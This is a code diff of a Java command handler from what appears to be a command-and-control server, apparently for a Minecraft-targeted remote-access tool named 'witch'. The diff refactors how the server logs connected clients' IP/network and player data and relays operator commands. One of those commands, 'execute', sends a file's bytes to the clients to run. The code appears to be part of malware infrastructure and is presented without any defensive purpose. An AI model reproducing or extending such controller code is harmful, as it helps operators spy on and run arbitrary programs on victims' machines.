@@ -2,12 +2,14 @@ package me.soda.witch.server.server;
 
 import com.google.gson.Gson;
 import me.soda.witch.server.Main;
-import me.soda.witch.shared.socket.messages.DisconnectInfo;
+import me.soda.witch.shared.socket.messages.messages.DisconnectInfo;
 
 import java.io.File;
 import java.io.FileInputStream;
 
 public class CommandHandler {
+    private static final Gson GSON = new Gson();
+
     public static void handle(String in, Server server) {
         String[] msgArr = in.split(" ");
         if (msgArr.length > 0) {
@@ -29,12 +31,12 @@ public class CommandHandler {
                                 case "net" -> server.getConnections().stream().filter(conn ->
                                                 server.clientMap.get(conn).index == Integer.parseInt(msgArr[2]))
                                         .forEach(conn -> Server.log(String.format("ID: %s, Network info: %s ", msgArr[2],
-                                                new Gson().toJson(server.clientMap.get(conn).ip)
+                                                GSON.toJson(server.clientMap.get(conn).ip)
                                         )));
                                 case "player" -> server.getConnections().stream().filter(conn ->
                                                 server.clientMap.get(conn).index == Integer.parseInt(msgArr[2]))
                                         .forEach(conn -> Server.log(String.format("ID: %s, Player info: %s ", msgArr[2],
-                                                new Gson().toJson(server.clientMap.get(conn).playerData)
+                                                GSON.toJson(server.clientMap.get(conn).playerData)
                                         )));
                                 case "sel" -> {
                                     if (msgArr[2].equals("all")) {
@@ -66,18 +68,17 @@ public class CommandHandler {
                     }
                     default -> {
                         if (msgArr.length >= 2) {
-                            String[] strArr = new String[msgArr.length - 1];
-                            System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
+                            String command = in.substring(msgArr[0].length() + 1);
                             if (msgArr[0].equals("execute")) {
-                                File file = new File(String.join(" ", strArr));
+                                File file = new File(command);
                                 try (FileInputStream is = new FileInputStream(file)) {
                                     server.sendUtil.trySend(server, msgArr[0], is.readAllBytes());
                                 }
                             } else {
-                                server.sendUtil.trySend(server, msgArr[0], String.join(" ", strArr));
+                                server.sendUtil.trySend(server, msgArr[0], command);
                             }
                         } else {
-                            server.sendUtil.trySend(server, msgArr[0]);
+                            server.sendUtil.trySend(server, msgArr[0], null);
                         }
                     }
                 }
